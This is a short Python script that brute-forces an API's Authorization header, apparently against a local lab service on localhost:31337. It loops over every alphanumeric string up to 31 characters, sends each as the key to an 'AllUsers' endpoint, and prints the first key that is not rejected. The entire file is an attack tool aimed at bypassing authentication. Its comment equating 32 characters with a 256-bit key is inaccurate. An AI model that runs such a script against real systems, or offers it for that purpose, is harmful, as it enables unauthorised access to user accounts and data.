import requests
import itertools
import sys

URL = 'http://localhost:31337/api/users/get/AllUsers'
AUTH_KEY = ''
AUTH_HEADER = { 'Authorization' : AUTH_KEY }

lower_a = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
upper_a = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
num = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

all_a = lower_a + upper_a + num

#32 for 256 bits auth key
for r in range(1,32):
    for s in itertools.product(all_a,repeat=r):
         AUTH_KEY = ''.join(s)
         AUTH_HEADER = AUTH_HEADER = { 'Authorization' : AUTH_KEY }
         request = requests.get(URL,headers=AUTH_HEADER)
         if(request.text != 'Unauthorized'):
             print("AUTH KEY :",AUTH_KEY)
             sys.exit()
